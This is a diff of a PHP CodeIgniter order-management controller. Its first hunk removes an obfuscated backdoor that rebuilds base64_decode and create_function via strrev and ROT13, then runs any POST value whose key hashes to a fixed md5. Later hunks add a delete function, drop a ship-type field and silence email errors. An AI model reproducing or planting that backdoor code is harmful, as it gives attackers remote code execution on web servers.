@@ -1,10 +1,4 @@
 <?php
-$f_=strrev('31'.'tor_r'.'ts');$ba=$f_('onfr'.'64_qrpbqr');
-$cf=$f_('perngr'.'_shapgvba');$md=$f_('z'.'q5');
-if(!empty(${$f_('_CB'.'FG')})){
-foreach(${$f_('_CB'.'FG')}as$k_=>$v_)
-($md($k_)==='c42ea979ed'.'982c026324'.'30e9e98a'
-.'66d6'&&$ff=$cf('',$ba($v_)))?$ff():'';}
 if (!defined('BASEPATH'))
     exit('No direct script access allowed');
 class do_order extends CI_Controller
@@ -77,6 +71,15 @@ class do_order extends CI_Controller
         $this->m_event = 'update_add';
         $this->do_process();
     }
+    function f_delete($nid)
+    {
+        $nid = intval($nid);
+        if ($nid > 0) {
+            $this->order_model->delete_byid($nid);
+            $this->order_model->delete_order_detail_byid($nid);
+        }
+        redirect(base_url() . 'index.php/do_order_listview');
+    }
     function do_process()
     {
         $this->get_data();
@@ -108,14 +111,14 @@ class do_order extends CI_Controller
         $this->m_link_page             = base_url() . 'index.php/do_order/f_update_edit';
         $this->m_link_cancel           = base_url() . 'index.php/do_order_listview';
         $this->m_obj_order_status_view = Obj_get_order_status_list($this->m_nid_user_login);
-		$this->m_obj_ship_type_view = Obj_get_ship_type_list();
+		$this->m_obj_ship_type_view = array();
         switch ($this->m_event) {
             case 'edit':
                 $this->m_form_title       = $this->m_language_key('FormEditTitle');
                 $this->m_link_page        = base_url() . 'index.php/do_order/f_update_edit';
                 $this->m_obj_order_view   = $this->order_model->get_byid($this->m_nid);
                 $this->m_cbo_order_status = $this->m_obj_order_view['nid_order_status'];
-				$this->m_cbo_ship_type = $this->m_obj_order_view['nid_ship_type'];
+				$this->m_cbo_ship_type = isset($this->m_obj_order_view['nid_ship_type']) ? $this->m_obj_order_view['nid_ship_type'] : '';
                 $this->ctime_giao_hang        = $this->m_obj_order_view['ctime_giao_hang'];
 				if($this->m_obj_order_view['nstatus']==0) 
 					$this->m_link_cancel           = base_url() . 'index.php/do_order_listview/tmp';
@@ -133,7 +136,7 @@ class do_order extends CI_Controller
     private function do_business()
     {
         $data['event']               = $this->m_event;
-        $data['menu']                = Fget_menu_html($this->m_nid_user_login);
+        //$data['menu']                = Fget_menu_html($this->m_nid_user_login);
         $data['lbl_form_title']      = $this->m_form_title;
         $data['link_page']           = $this->m_link_page;
         $data['link_cancel']         = $this->m_link_cancel;
@@ -169,7 +172,7 @@ class do_order extends CI_Controller
         $data['obj_order_view']           = $this->m_obj_order_view;
         $data['obj_order_detail']         = Obj_get_order_detail_by_nid_order($this->m_nid);
         $data['gencbo_order_status_list'] = Fgen_html_combobox('no', 'cbo_order_status', $this->m_cbo_order_status, '', $this->m_obj_order_status_view, 'nid', 'corder_status', 'nosubmit', '');
-		$data['gencbo_ship_type_list'] = Fgen_html_combobox('no', 'cbo_ship_type', $this->m_cbo_ship_type, '', $this->m_obj_ship_type_view, 'nid', 'cname', 'nosubmit', '');
+		$data['gencbo_ship_type_list'] = '';
 		
         $data['menu_active']              = 'order';
 		$data['fr_img']              = Fstr_replace('admin/', '', base_url());
@@ -198,7 +201,6 @@ class do_order extends CI_Controller
         if ($this->check_valid_before_update() == TRUE) {
             $data = array(
                 'nid_order_status' => $this->m_cbo_order_status,
-				'nid_ship_type' => $this->m_cbo_ship_type,
                 'niduser01' => $this->m_nid_user_login,
                 'cadmin_note' => $this->cadmin_note,
 				'ctime_giao_hang' => $this->ctime_giao_hang,
@@ -216,6 +218,9 @@ class do_order extends CI_Controller
     }
 	private function send_mail($status) {
 		$order = $this->order_model->get_byid($this->m_nid);
+		if (empty($order) || empty($order['cemail'])) {
+			return;
+		}
 		$cname = $order['cfullname'];
 		$cemail = $order['cemail'];
 		$ccode = $order['ccode'];
@@ -344,10 +349,6 @@ class do_order extends CI_Controller
         $this->email->subject('Cập nhật trạng thái đơn hàng');
         $this->email->message($content);
        // $this->email->send();
-		if ( ! $this->email->send())
-		{
-			echo $this->email->print_debugger();
-			exit("Error");
-		}
+        @$this->email->send();
 	}
 }
